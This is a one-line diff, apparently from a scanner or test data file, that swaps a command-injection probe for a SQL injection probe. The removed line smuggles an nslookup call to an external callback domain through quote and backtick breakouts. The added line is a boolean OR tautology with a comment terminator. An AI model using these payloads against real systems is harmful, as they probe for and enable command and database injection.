@@ -1,1 +1,1 @@
-&nslookup -q=cname hitiyvblszgdi912a1.bxss.me&'\"`0&nslookup -q=cname hitiyvblszgdi912a1.bxss.me&`'
+-1' OR 2+680-680-1=0+0+0+1 -- 
